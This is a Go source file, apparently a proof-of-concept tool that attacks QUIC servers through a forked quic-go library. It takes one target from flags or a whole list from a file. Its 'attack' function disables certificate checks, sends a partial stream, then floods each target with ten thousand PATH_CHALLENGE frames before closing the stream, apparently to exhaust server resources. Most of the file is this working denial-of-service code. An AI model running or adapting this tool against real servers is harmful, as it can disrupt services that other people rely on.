package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/k4ra5u/quic-go"
	"github.com/k4ra5u/quic-go/internal/protocol"
	"github.com/k4ra5u/quic-go/internal/wire"
	"github.com/quic-go/qpack"
)

type Header struct{ Name, Value string }
type Headers []Header

type HTTPMessage struct {
	Headers Headers
	Body    []byte
}

const addr = "localhost:4242"

// Start a server that echos all data on the first stream opened by the client
func echoServer() error {
	listener, err := quic.ListenAddr(addr, generateTLSConfig(), nil)
	if err != nil {
		return err
	}
	defer listener.Close()

	conn, err := listener.Accept(context.Background())
	if err != nil {
		return err
	}

	stream, err := conn.AcceptStream(context.Background())
	if err != nil {
		panic(err)
	}
	defer stream.Close()

	// Echo through the loggingWriter
	_, err = io.Copy(loggingWriter{stream}, stream)
	return err
}

var keyLog io.Writer

func main() {
	//go func() { log.Fatal(echoServer()) }()

	//keyLogFile := "C:\\Users\\13298\\Desktop\\key.log"
	keyLogFile := "/home/john/Desktop/cjj_related/key.log"
	//keyLogFile := "/mnt/hgfs/work/key.log"

	if len(keyLogFile) > 0 {
		f, err := os.Create(keyLogFile)
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()
		keyLog = f
	}
	serverName := "alternate.localhost.examp1e.net"
	println(serverName)

	req := &HTTPMessage{
		Headers: []Header{
			{":method", "GET"},
			{":path", "/index.html"},
			{":authority", serverName},
			{":scheme", "https"},
			{"user-agent", "Mozilla/5.0"},
		},
		Body: nil,
	}

	//args := []string{"alternate.localhost.examp1e.net", "192.168.132.1"}
	//args := []string{"alternate.localhost.examp1e.net", "117.33.164.64"}
	target_file := flag.String("f", "", "input file")
	target_addr := flag.String("i", "", "IP")
	target_port := flag.String("p", "", "PORT")
	target_alpn := flag.String("a", "", "ALPN")

	flag.Usage = func() {
		flag.PrintDefaults()
	}

	flag.Parse()

	if *target_file == "" && (*target_addr == "" || *target_port == "" || *target_alpn == "") {
		flag.Usage()
		return
	}

	if *target_file == "" {
		targetAddr := *target_addr
		targetPort := *target_port
		targetAlpn := *target_alpn

		if _, _, err := net.SplitHostPort(targetAddr); err != nil {
			targetAddr = net.JoinHostPort(targetAddr, targetPort)
		}
		var wg sync.WaitGroup
		wg.Add(1)
		resp, err := attack(targetAddr, serverName, req, targetAlpn, &wg)
		if err != nil {
			log.Fatalf("Error: %#v", err)
		}
		if resp != nil {
			for _, h := range resp.Headers {
				fmt.Printf("%v: %v\n", h.Name, h.Value)
			}
		}

	} else {
		Content, ferr := os.ReadFile(*target_file)
		if ferr != nil {
			fmt.Errorf("invalid file : %w", ferr)
			return
		}
		ips := [...]string{}
		ipSlice := ips[:]
		ports := [...]string{}
		portSlice := ports[:]
		alpns := [...]string{}
		alpnSlice := alpns[:]

		file_contents := bytes.Split(Content, []byte("\n"))
		length := len(file_contents)
		log.Println("Total %d items\n", length)

		for _, file_content := range file_contents {
			contents := bytes.Split(file_content, []byte(" "))
			ipSlice = append(ipSlice, string(contents[0]))
			portSlice = append(portSlice, string(contents[1]))
			alpnSlice = append(alpnSlice, string(contents[2]))
		}
		var wg sync.WaitGroup
		//results := make(chan *HTTPMessage)
		/*
			for i := 0; i < length; i++ {
				thisIP := ipSlice[i]
				thisPort := portSlice[i]
				thisAlpn := alpnSlice[i]
				if _, _, err := net.SplitHostPort(thisIP); err != nil {
					targetAddr := net.JoinHostPort(thisIP, thisPort)

					go func(id int) {
						//log.Printf("handling %s", targetAddr)
						try_failed := 1
						for j := 0; j < 1; j++ {
							wg.Add(1)
							_, err := attack(targetAddr, serverName, req, thisAlpn, &wg)
							if err == nil {
								break
							}
							//log.Printf("%s:%s", targetAddr, err.Error())
							try_failed -= 1
						}
						if try_failed == 0 {
							log.Printf("failed:%s %s %s", thisIP, thisPort, thisAlpn)
						}
					}(i)
					time.Sleep(time.Millisecond * 100)
				}
			}
		*/
		for i := 0; i < length; i++ {
			thisIP := ipSlice[i]
			thisPort := portSlice[i]
			thisAlpn := alpnSlice[i]
			if _, _, err := net.SplitHostPort(thisIP); err != nil {
				targetAddr := net.JoinHostPort(thisIP, thisPort)

				//log.Printf("handling %s", targetAddr)
				try_failed := 1
				for j := 0; j < 1; j++ {
					wg.Add(1)
					_, err := attack(targetAddr, serverName, req, thisAlpn, &wg)
					if err == nil {
						break
					}
					//log.Printf("%s:%s", targetAddr, err.Error())
					try_failed -= 1
				}
				if try_failed == 0 {
					log.Printf("failed:%s %s %s", thisIP, thisPort, thisAlpn)
				}
			}
		}
		//wg.Wait()
		log.Printf("All workers have finished, exiting the program.")
	}
	//fmt.Println()
	//fmt.Printf("%s\n", resp.Body)
}

func attack(connectAddr, serverName string, request *HTTPMessage, targetAlpn string, wg *sync.WaitGroup) (response *HTTPMessage, err error) {
	defer func() {
		wg.Done()
		//log.Printf("%s:ended", connectAddr)
	}()

	flushSize := 1024 * 4
	address := connectAddr
	name, port, err := net.SplitHostPort(address)
	if err != nil {
		//log.Printf("aaaaa")
		return nil, fmt.Errorf("invalid address %v: %w", address, err)
	}

	ip, err := net.LookupIP(name)
	if err != nil {
		//log.Printf("bbbbb")
		return nil, fmt.Errorf("lookup for %v failed: %w", name, err)
	}
	portInt, err := strconv.Atoi(port)
	if err != nil {
		//log.Printf("ccccc")
		return nil, fmt.Errorf("invalid port: %w", err)
	}

	udpConn, err := net.ListenPacket("udp", ":0")
	if err != nil {
		//log.Printf("eeeee")
		return nil, err
	}
	defer func() { _ = udpConn.Close() }()

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	go func() {
		<-ctx.Done()
		_ = udpConn.Close()
	}()

	udpAddr := &net.UDPAddr{
		IP:   ip[0],
		Port: portInt,
	}

	session, err := quic.Dial(ctx, udpConn, udpAddr,
		&tls.Config{
			//NextProtos: []string{"hq-interop"},
			NextProtos:         []string{targetAlpn},
			ServerName:         serverName,
			InsecureSkipVerify: true,
			KeyLogWriter:       keyLog,
		},
		&quic.Config{
			Versions:           []quic.VersionNumber{quic.Version1},
			MaxIncomingStreams: -1,
		})

	if err != nil {
		//log.Printf("%s:%s", connectAddr, err.Error())
		return nil, err
	}

	defer func() { _ = session.CloseWithError(0, "") }()

	if err := setupSession(session); err != nil {
		//log.Printf("ggggg%s", err.Error())
		return nil, err
	}

	requestStream, err := session.OpenStream()
	if err != nil {
		//log.Printf("hhhhh%s", err.Error())
		return nil, err
	}
	//log.Printf("%s:frames with headers and prefix sending", connectAddr)

	//构造前序的数据包：1024*100
	firstRange := bytes.NewBuffer(nil)
	requestHeaders := request.Headers
	requestHeaders = append(requestHeaders, Header{
		Name:  "content-length",
		Value: strconv.Itoa(flushSize + 138041),
	})
	//firstRange.Write(encodeHeaders(requestHeaders))
	firstRange.Write(bytes.Repeat([]byte("A"), flushSize-1))

	finFrameContent := bytes.Repeat([]byte("S"), 0)
	finFrameOffset := firstRange.Len() + len(finFrameContent)

	finFrame := &wire.StreamFrame{
		StreamID:       0,
		Offset:         protocol.ByteCount(finFrameOffset),
		Data:           finFrameContent,
		Fin:            true,
		DataLenPresent: true,
	}

	fin_frame := []wire.Frame{
		finFrame,
	}

	_, _ = requestStream.Write(firstRange.Bytes())

	randomBytes := make([]byte, 8)

	for i := 0; i < 1000; i++ {

		var path_challenge_frame []wire.Frame

		//padding = []byte(bytes.Repeat([]byte("\x00"), 200))
		for j := 0; j < 10; j++ {
			rand.Read(randomBytes)
			var randomBytesArray [8]byte
			copy(randomBytesArray[:], randomBytes)
			padding := []byte(bytes.Repeat([]byte("\x00"), 1172))
			padding = []byte("")
			path_challengeFrame := &wire.PathChallengeFrame{
				Data:    randomBytesArray,
				Padding: padding,
			}
			path_challenge_frame = append(path_challenge_frame, path_challengeFrame)

		}

		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
		time.Sleep(time.Millisecond * 1)
	}
	/*
		for i := 0; i < 1000; i++ {
			rand.Read(randomBytes)
			var randomBytesArray [8]byte
			copy(randomBytesArray[:], randomBytes)
			padding := []byte(bytes.Repeat([]byte("\x00"), 1172))
			padding = []byte("")
			//padding = []byte(bytes.Repeat([]byte("\x00"), 200))
			path_challengeFrame := &wire.PathChallengeFrame{
				Data:    randomBytesArray,
				Padding: padding,
			}
			path_challenge_frame := []wire.Frame{
				path_challengeFrame,
			}
			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
			time.Sleep(time.Millisecond * 1)
		}
	*/

	time.Sleep(time.Millisecond * 100)
	//time.Sleep(time.Second * 1)

	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(fin_frame)
	return nil, nil

}

type http3Frame struct {
	Type int
	Len  uint64
	Data []byte
}

func readFrame(b *bufio.Reader) (*http3Frame, error) {
	t, err := readVarInt(b)
	if err != nil {
		return nil, err
	}
	l, err := readVarInt(b)
	if err != nil {
		return nil, err
	}
	data := make([]byte, l)
	if _, err := io.ReadFull(b, data); err != nil {
		return nil, err
	}
	return &http3Frame{
		Type: int(t),
		Len:  l,
		Data: data,
	}, nil
}

func encodeHeaders(headers Headers) []byte {
	qpackBuf := bytes.NewBuffer(nil)
	e := qpack.NewEncoder(qpackBuf)
	for _, h := range headers {
		_ = e.WriteField(qpack.HeaderField{Name: h.Name, Value: h.Value})
	}
	headersFrame := bytes.NewBuffer(nil)
	writeVarInt(headersFrame, 0x1)
	writeVarInt(headersFrame, uint64(qpackBuf.Len()))
	headersFrame.Write(qpackBuf.Bytes())
	return headersFrame.Bytes()
}

func encodeBodyHeader(size int) (frame []byte) {
	buf := bytes.NewBuffer(nil)
	writeVarInt(buf, 0x00)
	writeVarInt(buf, uint64(size))
	return buf.Bytes()
}

func setupSession(session quic.Connection) error {
	str, err := session.OpenUniStream()
	if err != nil {
		return err
	}
	buf := &bytes.Buffer{}
	buf.Write([]byte{0x0, 0x4, 0x0}) // TODO: this is shit
	if _, err := str.Write(buf.Bytes()); err != nil {
		return err
	}
	return nil
}

const (
	maxVarInt1 = 63
	maxVarInt2 = 16383
	maxVarInt4 = 1073741823
	maxVarInt8 = 4611686018427387903
)

func readVarInt(b io.ByteReader) (uint64, error) {
	firstByte, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	// the first two bits of the first byte encode the length
	intLen := 1 << ((firstByte & 0xc0) >> 6)
	b1 := firstByte & (0xff - 0xc0)
	if intLen == 1 {
		return uint64(b1), nil
	}
	b2, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	if intLen == 2 {
		return uint64(b2) + uint64(b1)<<8, nil
	}
	b3, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	b4, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	if intLen == 4 {
		return uint64(b4) + uint64(b3)<<8 + uint64(b2)<<16 + uint64(b1)<<24, nil
	}
	b5, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	b6, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	b7, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	b8, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	return uint64(b8) + uint64(b7)<<8 + uint64(b6)<<16 + uint64(b5)<<24 + uint64(b4)<<32 + uint64(b3)<<40 + uint64(b2)<<48 + uint64(b1)<<56, nil
}

func writeVarInt(b *bytes.Buffer, i uint64) {
	if i <= maxVarInt1 {
		b.WriteByte(uint8(i))
	} else if i <= maxVarInt2 {
		b.Write([]byte{uint8(i>>8) | 0x40, uint8(i)})
	} else if i <= maxVarInt4 {
		b.Write([]byte{uint8(i>>24) | 0x80, uint8(i >> 16), uint8(i >> 8), uint8(i)})
	} else if i <= maxVarInt8 {
		b.Write([]byte{
			uint8(i>>56) | 0xc0, uint8(i >> 48), uint8(i >> 40), uint8(i >> 32),
			uint8(i >> 24), uint8(i >> 16), uint8(i >> 8), uint8(i),
		})
	} else {
		panic(fmt.Sprintf("%#x doesn't fit into 62 bits", i))
	}
}

// A wrapper for io.Writer that also logs the message.
type loggingWriter struct{ io.Writer }

func (w loggingWriter) Write(b []byte) (int, error) {
	fmt.Printf("Server: Got '%s'\n", string(b))
	return w.Writer.Write(b)
}

// Setup a bare-bones TLS config for the server
func generateTLSConfig() *tls.Config {
	key, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		panic(err)
	}
	template := x509.Certificate{SerialNumber: big.NewInt(1)}
	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
	if err != nil {
		panic(err)
	}
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})

	tlsCert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		panic(err)
	}
	return &tls.Config{
		Certificates: []tls.Certificate{tlsCert},
		NextProtos:   []string{"quic-echo-example"},
	}
}

func send_one_req(num int, session quic.Connection, request *HTTPMessage) (response *HTTPMessage, err error) {
	ctx, _ := context.WithTimeout(context.Background(), 500*time.Second)
	request_stream, err := session.OpenStreamSync(ctx)
	request_stream_ID := request_stream.StreamID()
	if err != nil {
		return nil, err
	}
	firstRange := bytes.NewBuffer(nil)
	requestHeaders := request.Headers
	firstRange.Write(encodeHeaders(requestHeaders))
	//firstRange.Write(bytes.Repeat([]byte("A"), 8392824))

	requestLen := firstRange.Len()
	finFrame := &wire.StreamFrame{
		StreamID:       request_stream_ID,
		Offset:         protocol.ByteCount(requestLen),
		Data:           nil,
		Fin:            true,
		DataLenPresent: true,
	}
	fin_frame := []wire.Frame{
		finFrame,
	}

	_, _ = request_stream.Write(firstRange.Bytes())
	/*
		for i := 1; i < 10; i++ {
			balanceRange := bytes.NewBuffer(nil)
			balanceRange.Write(bytes.Repeat([]byte("A"), 750))
			_, _ = request_stream.Write(balanceRange.Bytes())
		}
	*/
	//log.Printf(hex.EncodeToString(firstRange.Bytes()))
	//log.Printf("sending %d frames with headers and prefix sent", request_stream_ID)

	request_stream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(fin_frame)
	var (
		headers Headers
		body    []byte
	)
	decoder := qpack.NewDecoder(func(f qpack.HeaderField) {
		headers = append(headers, Header{
			Name:  f.Name,
			Value: f.Value,
		})
	})
	frameBuffer := bufio.NewReader(request_stream)
	//frameBuffer = bufio.NewReader(requestStream)
	for {
		//buf, _ := frameBuffer.ReadBytes('\x00')
		//log.Println(buf)
		frame, err := readFrame(frameBuffer)
		if err != nil {

			if err == io.EOF {
				break
			}

			if qErr, ok := err.(interface{ IsApplicationError() bool }); ok {
				if qErr.IsApplicationError() {
					return nil, fmt.Errorf("connection dropped: %v", qErr)
				}
			}
			return nil, err
		}
		switch frame.Type {
		case 0x0:
			body = append(body, frame.Data...)
		case 0x1:
			if _, err := decoder.Write(frame.Data); err != nil {
				return nil, err
			}
		default:
			// ignore unknown frame types for now
		}
	}
	log.Println(headers, body)

	resetFrame := &wire.ResetStreamFrame{
		StreamID:  request_stream_ID,
		ErrorCode: 6,
		FinalSize: protocol.ByteCount(requestLen),
	}
	reset_frame := []wire.Frame{
		resetFrame,
	}
	stopSendingFrame := &wire.StopSendingFrame{
		StreamID:  request_stream_ID,
		ErrorCode: 0x100,
	}
	stopSending_frame := []wire.Frame{
		stopSendingFrame,
	}

	time.Sleep(time.Microsecond * 100)
	request_stream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(stopSending_frame)
	time.Sleep(time.Microsecond * 100)
	request_stream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(reset_frame)
	return &HTTPMessage{
		Headers: headers,
		Body:    body,
	}, nil
}
